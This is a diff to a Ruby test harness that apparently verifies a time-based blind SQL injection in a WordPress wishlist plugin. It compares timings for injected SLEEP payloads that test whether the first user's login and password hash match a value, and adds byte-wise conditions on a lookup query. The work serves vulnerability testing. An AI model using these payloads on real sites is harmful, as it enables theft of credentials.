@@ -33,6 +33,9 @@ module TiWishlistNative
     expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
     expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
     expect(data.values_at('prefix', 'table_prefix', 'mode')).to eq([@prefix, ENV.fetch('TI_WISHLIST_TABLE_PREFIX', 'wp_'), @mode])
+    if data.fetch('table_prefix') == 'wp_native_'
+      expect(data.fetch('prefix_lookup')).to eq({ 'value' => 'wp_native_', 'byte5_gt127' => '0', 'byte5_gt96' => '1' })
+    end
     expect(data.fetch('permalink_structure')).to eq(ENV['TI_WISHLIST_PLAIN'] == '1' ? '' : '/%postname%/')
     expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
     installed = @mode != 'absent'
@@ -98,7 +101,7 @@ module TiWishlistNative
   end
 
   def wl_controls(phase)
-    control = { phase: phase, mode: @mode, status: 'started' }
+    control = { phase: phase, mode: @mode, delay: @delay, status: 'started' }
     @wl.fetch(:controls) << control
     wl_save
     response = wl_http(phase + '-login', @prefix + '/wp-login.php')
@@ -130,23 +133,32 @@ module TiWishlistNative
         expect(prefix).to match(/\A[a-z_]+\z/)
         whole_row = user.fetch('user_login') + ';' + user.fetch('user_pass')
         conditions = { 'false' => '1=0', 'true' => '1=1', 'row-false' => "(SELECT CONCAT(user_login,0x3b,user_pass) FROM #{prefix}users ORDER BY ID LIMIT 1)=0x" + (whole_row + 'wrong').unpack1('H*'), 'row-true' => "(SELECT CONCAT(user_login,0x3b,user_pass) FROM #{prefix}users ORDER BY ID LIMIT 1)=0x" + whole_row.unpack1('H*') }
+        pairs = [['true', 'false'], ['row-true', 'row-false']]
+        if prefix == 'wp_native_'
+          # Exercise the expensive lookup from the captured failure, as well as
+          # a simple data query. Only the comparison threshold differs here.
+          lookup = File.binread('test/module_targets/ti_wishlist/prefix-query.sql')
+          conditions['prefix-false'] = "ord(mid(cast((#{lookup}) as binary),5,1))>127"
+          conditions['prefix-true'] = "ord(mid(cast((#{lookup}) as binary),5,1))>96"
+          pairs << ['prefix-true', 'prefix-false']
+        end
         wl_query(phase + '-benign', share, 'ASC', identifier)
         timings = conditions.to_h { |label, _| [label, []] }
         3.times do |iteration|
           conditions.each do |label, condition|
-            wl_query("#{phase}-#{label}-#{iteration}", share, ",(SELECT IF(#{condition},SLEEP(0.5),0))-- ", identifier)
+            wl_query("#{phase}-#{label}-#{iteration}", share, ",(SELECT IF(#{condition},SLEEP(#{@delay}),0))-- ", identifier)
             timings.fetch(label) << @wl.fetch(:requests).last.fetch(:seconds)
           end
         end
         medians = timings.transform_values { |values| values.sort[1] }
         control.merge!(timings: timings, medians: medians, share_key: share)
         wl_save
-        [['true', 'false'], ['row-true', 'row-false']].each do |positive, negative|
+        pairs.each do |positive, negative|
           gap = medians.fetch(positive) - medians.fetch(negative)
           if @vulnerable
-            expect(gap).to be >= 0.4
-            expect(timings.fetch(negative).max).to be < 0.4
-            expect(timings.fetch(positive).min).to be >= 0.5
+            expect(gap).to be >= @delay - 0.1
+            expect(timings.fetch(negative).max).to be < @delay - 0.1
+            expect(timings.fetch(positive).min).to be >= @delay
           else
             expect(gap.abs).to be < 0.2
           end
